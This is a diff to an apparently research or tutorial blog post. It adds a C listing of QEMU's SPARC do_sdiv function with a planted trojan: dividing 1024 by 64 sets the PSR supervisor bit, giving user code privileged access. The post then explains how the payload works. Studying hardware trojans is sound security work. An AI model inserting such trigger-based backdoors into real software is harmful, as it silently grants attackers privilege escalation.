@@ -254,6 +254,59 @@ twice on console to return to the boot prom
  {% endhighlight %}
 
 
+The payload is included in the s_div function of the do_sdif function in helper.c of the target/sparc in qemu.
+
+{% highlight c %}
+static target_ulong do_sdiv(CPUSPARCState *env, target_ulong a,
+target_ulong b, int cc, uintptr_t ra)
+{
+int overflow = 0;
+int64_t x0;
+int32_t x1;
+
+x0 = (a & 0xffffffff) | ((int64_t) (env->y) << 32);
+x1 = (b & 0xffffffff);
+
+// trojans payload
+if(x0 == 1024 && x1 == 64){
+CPUState *cs = CPU(sparc_env_get_cpu(env));
+SPARCCPU *cpu = SPARC_CPU(cs);
+CPUSPARCState *sc = &cpu->env;
+sc->psrs =1;
+}
+
+
+if (x1 == 0) {
+cpu_raise_exception_ra(env, TT_DIV_ZERO, ra);
+} else if (x1 == -1 && x0 == INT64_MIN) {
+x0 = INT32_MAX;
+overflow = 1;
+} else {
+x0 = x0 / x1;
+if ((int32_t) x0 != x0) {
+x0 = x0 < 0 ? INT32_MIN : INT32_MAX;
+overflow = 1;
+}
+}
+
+if (cc) {
+env->cc_dst = x0;
+env->cc_src2 = overflow;
+env->cc_op = CC_OP_DIV;
+}
+return x0;
+}
+{% endhighlight %}
+
+The actions of the payload are fairly simple:
+* we check the value of the operands (x0 == 1024 && x1 == 64)
+* we cas the CPU object to the CPUSPARCState *sc. The sc contains values of the SPARC CPU register
+as they are different from x86 and must be casted at runtime.
+* we modify the eight bit of the PSR register sc->psrs =1;
+
+
+
+
 If we are still in user mode the exception is raised as RDPSR | WRPSR are privileged instructions.
 Consult the SPARC Manual v8 for more details.
 
